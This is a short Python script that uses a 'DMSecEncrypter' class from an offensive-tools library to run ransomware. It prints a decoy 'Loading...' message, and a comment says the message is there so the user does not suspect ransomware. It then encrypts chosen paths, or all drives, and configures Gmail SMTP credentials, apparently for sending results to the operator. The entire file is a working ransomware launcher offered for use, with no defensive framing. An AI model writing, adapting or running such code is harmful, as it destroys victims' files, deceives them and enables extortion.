from pyhtools.evil_files.ransomwares.dmsec.encrypter import DMSecEncrypter

# Print some meaningful text, so that user don't suspect program as ransomeware
print('[*] Loading...')

# Specify paths to be encrypted
PATHS = [
    r'path_to_be_encrypted',
]

# don't pass PATHS if all the drives are to be encrypted
encrypter = DMSecEncrypter(
    paths=PATHS,
    email='yourgmailid',
    passwd='yourapppassword',
    smtp_server='smtp.gmail.com',
    smtp_port=587,
)

encrypter.start()
print('[*] Completed')
